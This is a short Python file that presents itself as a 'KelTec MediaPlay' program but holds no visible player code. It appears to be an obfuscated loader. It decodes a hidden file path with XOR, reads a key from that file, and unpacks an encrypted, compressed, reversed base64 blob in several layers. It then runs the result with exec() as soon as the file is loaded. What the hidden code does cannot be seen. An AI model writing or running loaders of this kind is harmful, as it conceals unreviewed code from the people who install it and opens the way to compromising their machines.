# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 938786 ^ 998821
_lx1_1 = len("e81daf")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-472848)
_lx3_3 = 330047 * 0
_lx4_4 = 720037 ^ 192874
_M = 'QglqMmH2/eZbn6cK5iqTMgw4Snu4vRHEWT7QrIUJBMAVDHsuIbf6plWdrgjmLJcyBGQaeu67FZYDY437jQoJl0lde3IkuvihUcv4'
_D = '=QPF73TjBhsG+ZU/xoOwlHsgGvbQuXe/QTB1g5DFGM42IHoua6sXUygBa3NFnadH2PMne3tX82wwa1WflnzOtJ1M9pkUAS3L+b19fqu5lQeyYvmgSg5vLhgMZ1i3d0QIP2hBVzmB9xII3SXX8GxKXSqXtjORRwc2MrF1+iXsxhtZwn/YQCQ/9hBz83ueFNYqdxw7LE1gT+F+AJuDGeUP9fyPFicnJrlvOJ9ZlEJga2iflkm6pFCn5VEoJxTlWm66GZtCRZLZIMHG9+oYJqP530Zda0uMd2I6IGGPCa/6C4iARw8W/z/8yXbfCr0blTMwuRFd8Ba1p7+uMSQOWzW6X9xOs/FyhH2/8sQG5+YZwg3P2oVbnxLFyuEMraY5FfNyXFAL6qVTrGuJ5jVoxnj05eFK+Z3LRoDFYjMvCeMFCS+9oJe8uyW8AV1ZIRkmaGuG74Qug1dnLGbqfX8+pOCrq5VrDDTTM3e/XKTFd3hB6Ce5HUmC3SZc8Ofv/SX0OvQdyyYo+udtG9XPwEOeWSgw1sxlIuLYGdkcerVoZG4v02aKrrbl+2IOTNB+fF6k3FVdUiYqdEJ71GjEaAXkB1MBXfBLrmYEcBCNY2atHHhpOmnHwyjg7dnQKqLOrFFeuYBExrbNF/U8uuKyl3lFWGtZP4qRtLDlV5h59Xzvl7UWpYMGGzBsLAZyeb68Ze93kldpmavSQrAooTKDaRq4VzDcpLq65uv7a8c9viHg3a4om6lSMzsBM2A1004KhGsS7wdUUhJUdQ791LhMy1sCdph21gk4YOhX5a57q03SspiRoTQq1PA2f6B/wHIKHyIeBeQFhJsZCdA/l0IoR/hGhhRvDMvLSj5x2XEynjsvCitTtn12JWm0nT9RzSRvKSiB3Y0XxAVP3OYvt1KCiEWPw0MA/BRErmv4iPM9xpdGghSugkiGyj7wFrdyotkeZVEJLaOhwvgSxzC1FpoFI4/0WW9/0ughOx2Cdfo24j0LzeTJz4PYEs1y0wTsXXv5uUAcfZZSAA40M8ns1cJthlx7Zj64oBpiUz1ywd0quzOUSQLM2GhJwt2ziHqxOACDOpBcY6x72IJOOFA7+KRN1CXVoHBdEqohqRl0Tn2mcyxT7mWhn4AYRlStGDQEtWlc14F7HnSqaLhSK6vSwhtPcbqnRRPUp1wavt8OcpNGbm/Qe+Etfs5kcV2Uk9geMINjiRqCpEe2m1tksSkmscWISfn32z53OP3rjOO2/wtnmos0Umj9CveY28A0NqTcHYUBW5xkqUdmAjEBs0ESHIN0kV7f5u3k1d8AY6m0r9wDPC1+ak71cxIn7JeRU09yPXEDuAhtvMAAucOGCPKmfh0ntEB20oXa7Buq5vXE+LS0W3c6RmiQM4vLr7eu5BSCY45aBKPjia22PKY1Nb4G8FKWd4CDXtgIkHaBPDiaceY/IAp4zB6mkM01hXOt3Sqda7S/MXB4WTJ9FWcN4AaQJBIRQrq6wdrOH8RKGAhbQyvSzUp42fpdSircnZxoM1NAaxGgiW/9N4Ic+DFDwQFuJZQ/UgvjcJmEogdjn16xoM+49T0b5EEZpjde9yRsZw4Dm1eM3YudMeC/Whwrj7kTRDvIf2qJA+xGxVGKhieg/1XIbDTnhdKrPQ+6/RImtHEI8dFrngjQTyC00tfhLbUhwWFi8X8RGmEExq+a+fM7'

_3132=[19,148,86,198,88,228,111,80]+[232,122,78,38,154,23,176,139]
_ea5e=[78,242,104,161,246,252,62,199]+[23,68,26,130,129,50,137,66]
_fe5c=bytes([a^b for a,b in zip([97,241,37,169,45,150,12,53,155,85,42,71,238,118],_3132*8)]).decode()
_6f95=bytes([a^b for a,b in zip([61,151,28,213,159,146,89,180,57,38,115,236],_ea5e*8)]).decode()
_2e3d=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),*_fe5c.split('/'),_6f95)
with open(_2e3d,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()